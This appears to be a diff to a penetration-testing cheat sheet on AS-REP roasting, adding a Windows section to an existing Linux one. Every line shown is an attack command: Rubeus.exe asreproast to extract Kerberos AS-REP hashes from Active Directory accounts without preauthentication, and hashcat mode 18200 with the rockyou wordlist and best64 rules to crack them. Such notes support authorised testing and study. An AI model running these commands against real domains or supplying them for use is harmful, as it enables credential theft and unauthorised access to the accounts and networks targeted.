@@ -8,3 +8,8 @@ $ hashcat --help | grep -i "Kerberos"
 
 # Running hashcat:
 $ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+========== ON WINDOWS ===========
+.\Rubeus.exe asreproast /nowrap
+$ sudo hashcat -m 18200 hashes2.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
